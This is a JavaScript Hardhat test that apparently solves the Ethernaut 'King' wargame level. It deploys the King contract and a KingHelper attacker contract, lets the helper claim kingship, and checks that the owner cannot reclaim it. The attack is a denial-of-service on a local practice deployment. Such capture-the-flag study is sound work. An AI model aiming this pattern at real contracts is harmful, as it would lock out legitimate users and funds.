
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level9 = await hre.ethers.getContractFactory("King");
        const level9 = await Level9.deploy({value: ethers.utils.parseEther("10")});
        await level9.deployed();
        const Level9Helper = await hre.ethers.getContractFactory("KingHelper");
        const level9Helper = await Level9Helper.deploy(level9.address);
        await level9Helper.deployed();
        console.log(
          `Level9 deployed at address ${level9.address}`
        )
        console.log(
          `Level9Helper deployed at address ${level9Helper.address}`
        )
        return {level9, level9Helper, owner, otherAccount};
    }

    /*
    When you submit the instance back to the level, the level is going to reclaim kingship.
    You will beat the level if you can avoid such a self proclamation.
    */
    describe("Solve", function() {
        it("Should solve level9", async function() {
            const {level9, level9Helper, owner, otherAccount} = await loadFixture(deployFallback);
            // Send 11 eth otherAccount
            // otherAccount is now king
            // Send 12 eth from owner
            // We should still be king
            //let king = await level9.connect(otherAccount)._king();
            //console.log(king);
            const prize = await level9.connect(otherAccount).prize();
            king = await level9.connect(otherAccount)._king();
            tx = {  to: level9.address,
                    value: prize
            }
            await level9Helper.connect(otherAccount).kingMe({value: prize});
            try {
                await owner.sendTransaction(tx);
            }
            catch {
                ;
            }
            king = await level9.connect(otherAccount)._king();
            expect(king).equals(level9Helper.address)
        })
    });
});